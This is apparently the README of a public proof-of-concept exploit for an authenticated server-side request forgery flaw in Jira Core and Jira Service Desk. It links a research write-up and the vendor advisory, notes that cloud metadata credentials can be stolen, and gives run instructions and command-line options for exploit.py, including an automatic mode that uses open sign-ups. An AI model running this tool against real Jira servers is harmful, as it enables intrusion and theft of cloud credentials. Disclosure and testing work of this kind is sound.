## Blog Post

The blog post detailing the steps taken for the discovery of this vulnerability can be found [here](https://blog.assetnote.io/2022/06/26/exploiting-ssrf-in-jira/).

## Description

Jira Core & Jira Service Desk are vulnerable to server-side request forgery after authenticating. In some cases, it is possible to leverage open sign ups in Jira Core or Jira Service Desk to exploit this server-side request forgery flaw without having known credentials.

## Impact

The SSRF vulnerability allows attackers to send HTTP requests using any HTTP method, headers and body to arbitrary URLs. When Jira is deployed on a cloud environment, an attacker can leverage this exploit chain to obtain cloud credentials or other sensitive information through the metadata IP address.

## Affected Software

As per the advisory from Atlassian, please see the following knowledge base article to confirm if you are running an affected software version: [https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html](https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html)

# Usage Instructions

```
pip3 install -r requirements.txt
```

and then you can use the exploit using:

```
python3 exploit.py
```

Help:

```
usage: exploit.py [-h] --target TARGET --ssrf SSRF --mode MODE [--software SOFTWARE] [--username USERNAME] [--email EMAIL] [--password PASSWORD]

optional arguments:
  -h, --help           show this help message and exit
  --target TARGET      i.e. http://re.local:8090
  --ssrf SSRF          i.e. example.com (no protocol pls)
  --mode MODE          i.e. manual or automatic - manual mode you need to provide user auth info
  --software SOFTWARE  i.e. jira or jsd - only needed for manual mode
  --username USERNAME  i.e. admin - only needed for manual jira mode
  --email EMAIL        i.e. admin@example.com - only needed for manual jira service desk mode
  --password PASSWORD  i.e. testing123 - only needed for manual mode
```

If you already have credentials for Jira / Jira Service Desk, then set the `--mode` to `manual` and the `--software` argument to either `jira` or `jsd`.
